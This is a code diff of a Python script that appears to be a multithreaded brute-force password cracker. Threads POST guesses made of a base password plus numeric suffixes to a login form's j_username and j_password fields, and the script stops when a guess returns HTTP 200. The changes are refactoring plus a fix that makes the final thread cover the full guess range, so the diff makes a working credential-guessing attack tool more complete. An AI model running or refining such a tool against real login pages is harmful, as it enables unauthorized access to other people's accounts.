@@ -43,11 +43,11 @@ class cfg:
         return self.configFileData[Thing]
 
 
-def DebugPrint(Catagory, Text, Color):
+def DebugPrint(Category, Text, Color):
     if not DEBUG:
         return
     print(colored('['+datetime.now().strftime("%H:%M:%S")+'] ', 'yellow') +
-          colored('['+Catagory+'] ', 'magenta')+colored(Text, Color))
+          colored('['+Category+'] ', 'magenta')+colored(Text, Color))
 
 
 class check(threading.Thread):
@@ -66,19 +66,17 @@ class check(threading.Thread):
     def run(self):
         for i in range(self.startIndex, self.endIndex):
             toTry = self.pWord + (str(i).zfill(len(str(self.pWordIta))))
-            DebugPrint(
-                "Crack", f'{colored("Trying", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(toTry, "green")}', "cyan")
+            DebugPrint("Crack", f'{colored("Trying", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(toTry, "green")}', "cyan")
             try:
                 ses = requests.Session()
                 ses.max_redirects = 2
-                data = ses.post(self.url, timeout=self.timeout, data={
-                                "j_password": toTry, "j_username": self.uName})
+                dataToSend={"j_password": toTry, "j_username": self.uName}
+                data = ses.post(self.url, timeout=self.timeout, data=dataToSend)
             except (requests.exceptions.TooManyRedirects, requests.exceptions.Timeout):
                 continue
             if data.status_code != 200:
                 continue
-            DebugPrint(
-                "Complete", f'{colored("Password", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(f"{self.pWord}{str(i).zfill(2)}", "green")} {colored(f"[{int(time.time() - self.startTime)}]", "blue")}', "cyan")
+            DebugPrint("Complete", f'{colored("Password", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(f"{self.pWord}{str(i).zfill(2)}", "green")} {colored(f"[{int(time.time() - self.startTime)}]", "blue")}', "cyan")
             os._exit(0)
 
 ####### MAIN FUNCTION #######
@@ -96,13 +94,12 @@ def main():
     threads = int(config.get('threads'))
     startTime = time.time()
 
-    DebugPrint(
-        "Info", f'{colored("Username", "cyan")} {colored(uName, "blue")}', "cyan")
+    DebugPrint("Info", f'{colored("Username", "cyan")} {colored(uName, "blue")}', "cyan")
 
     for i in range(threads):
         startIndex = int((pWordIta/threads - 1))
-        t = check(i, url, pWordIta, pWord, uName, timeout,
-                  startTime, startIndex * i, startIndex * (i + 1))
+        endIndex = pWordIta if i == threads - 1 else startIndex * (i + 1)
+        t = check(i, url, pWordIta, pWord, uName, timeout, startTime, startIndex * i, endIndex)
         t.daemon = True
         t.start()
 
